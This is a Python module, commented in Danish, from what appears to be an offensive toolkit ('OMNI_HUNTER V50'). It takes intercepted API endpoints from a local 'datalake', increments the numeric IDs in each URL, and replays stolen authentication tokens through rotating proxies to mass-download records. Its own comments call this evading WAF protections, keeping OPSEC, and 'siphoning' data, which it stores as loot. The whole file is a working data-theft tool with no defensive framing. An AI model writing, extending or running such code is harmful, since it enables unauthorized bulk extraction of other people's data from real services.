# -*- coding: utf-8 -*-
"""
🚀 OMNI_HUNTER V50: DEEP DATA HARVESTER
📌 Formål: Læser interceptede API'er fra Datalaken, muterer ID'er asynkront, 
og mass-høster databaser via Token-replays forbi WAF-skjolde.
"""
import sys
import os
import json
import sqlite3
import asyncio
import re
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional, List

sys.path.append(str(Path(__file__).resolve().parent.parent))
from core.base_module import BaseModule, ModuleCategory
from core.utils import C, session, datalake
from core.network import AsyncProxyManager, send_authenticated_replay

class DeepDataHarvester(BaseModule):
    """GOLIATH V50: Mass Data Extractor (Batch 10)."""
    
    def __init__(self):
        super().__init__()
        self.name = "DEEP DATA HARVESTER & ID-MUTATOR"
        self.description = "Systematisk mass-scraping af interceptede API'er via Token Genbrug."
        self.category = ModuleCategory.NETWORK
        self.data = {
            "Target": "",
            "Endpoints_Fuzzed": 0,
            "Payloads_Harvested": 0,
            "Harvested_Payloads": [],
            "Timestamp": datetime.now().isoformat()
        }
        self.max_mutations = 50 # Hvor mange ID'er/sider den skal gætte pr. endpoint for OPSEC

    def _get_endpoints_from_datalake(self, target: str) -> List[str]:
        db_path = Path(session.get("loot_folder", "loot_evidence")) / "omni_datalake.db"
        endpoints = set()
        if db_path.exists():
            try:
                with sqlite3.connect(db_path) as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT endpoint FROM extracted_apis WHERE target=? ORDER BY timestamp DESC LIMIT 10", (target,))
                    for row in cursor.fetchall():
                        endpoints.add(row[0])
            except Exception as e:
                print(f"{C.RED}[!] Databasefejl ved læsning af API'er: {e}{C.RESET}")
        return list(endpoints)

    def _generate_mutations(self, url: str) -> List[str]:
        """Heuristisk mutation: Finder tal i URL'en (f.eks. ID'er) og genererer næste sekvens."""
        mutations = [url]
        # Matcher det sidste tal i URL'en (fx /api/user/123 eller ?offset=0)
        match = re.search(r'(\d+)(?!.*\d)', url)
        if match:
            base_val = int(match.group(1))
            prefix = url[:match.start()]
            suffix = url[match.end():]
            for i in range(1, self.max_mutations + 1):
                mutations.append(f"{prefix}{base_val + i}{suffix}")
        return mutations

    async def _harvest_mass_data(self, urls: List[str], target: str):
        proxy_mgr = AsyncProxyManager()
        tasks = [send_authenticated_replay(url, target, proxy_mgr) for url in urls]
        
        results = await asyncio.gather(*tasks)
        for idx, res in enumerate(results):
            if res:
                self.data["Harvested_Payloads"].append({
                    "url": urls[idx],
                    "payload": res
                })
                self.data["Payloads_Harvested"] += 1
                print(f"{C.GREEN}    🔥 HARVEST SUCCESS: Siphoned data fra {urls[idx][:60]}...{C.RESET}")

    def run(self, driver: Optional[Any] = None, target: str = "") -> Dict[str, Any]:
        print(f"\n{C.CYAN}{'='*60}\n[26] DEEP DATA HARVESTER & MUTATOR V50\n{'='*60}{C.RESET}")
        self.target = target.strip() if target else "https://example.com"
        if not self.target.startswith("http"): self.target = f"https://{self.target}"
        self.data["Target"] = self.target
        
        endpoints = self._get_endpoints_from_datalake(self.target)
        if not endpoints:
            print(f"{C.YELLOW}[*] Ingen interceptede API'er fundet i Datalaken for {self.target}. Kør Modul 25 først!{C.RESET}")
            return self.data
            
        print(f"{C.YELLOW}[*] Fandt {len(endpoints)} endpoints for målet. Initierer ID-Mutation & Mass-Harvesting...{C.RESET}")
        
        all_mutated_urls = []
        for ep in endpoints:
            all_mutated_urls.extend(self._generate_mutations(ep))
            self.data["Endpoints_Fuzzed"] += 1
            
        print(f"{C.MAGENTA}[*] Genererede {len(all_mutated_urls)} målrettede URL'er til data-siphoning.{C.RESET}")
        
        loop = asyncio.get_event_loop()
        if not loop.is_running(): loop.run_until_complete(self._harvest_mass_data(all_mutated_urls, self.target))
        else: loop.create_task(self._harvest_mass_data(all_mutated_urls, self.target))
        
        print(f"\n{C.GREEN}[✓] Deep Data Harvest fuldført! Suget {self.data['Payloads_Harvested']} JSON-blobs ned.{C.RESET}")
        datalake.ingest(self.name, self.target, self.data)
        
        return self.data